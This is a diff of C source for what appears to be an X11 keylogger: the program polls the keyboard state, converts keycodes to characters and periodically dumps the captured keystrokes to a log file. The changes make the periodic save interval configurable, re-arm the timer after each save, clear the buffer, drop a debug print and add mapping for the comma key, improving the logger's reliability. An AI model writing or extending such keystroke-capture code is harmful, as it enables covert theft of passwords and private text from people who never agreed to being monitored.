@@ -35,7 +35,7 @@ int main(void)
     char *char_ptr;
     
     signal(SIGALRM, &writelog);
-    alarm(60);
+    alarm(SAVESEC);
     disp = XOpenDisplay(HOSTNAME);
     XSynchronize(disp, 1);
     XQueryKeymap(disp, saved); 
@@ -52,7 +52,6 @@ int main(void)
 }
 
 void writelog(int signal){
-   puts("Writed");
    FILE *logfile;
    char filename[50];
    time_t now;
@@ -71,6 +70,8 @@ void writelog(int signal){
   fwrite(logmem, sizeof(char), sizeof(logmem), logfile);
   fclose(logfile);
   memset(logmem, 0, sizeof(logmem)-1);
+  logmem[0] = '\0';
+  alarm(SAVESEC);
 }
 
 char* getkeystr(char *keys, char *saved){
@@ -98,6 +99,7 @@ char* keycodetoStr(int keycode, int mod){
    else if(strcmp(keyname, "Shift_L") == 0) return "";
    else if(strcmp(keyname, "Shift_R") == 0) return "";
    else if(strcmp(keyname, "at") == 0) return "@";
+   else if(strcmp(keyname, "comma") == 0) return ",";
    else if(strcmp(keyname, "ISO_Level3_Shift") == 0){
       ksym = XKeycodeToKeysym(disp, keycode, ISO3_INDEX);
       keyname = XKeysymToString(ksym);
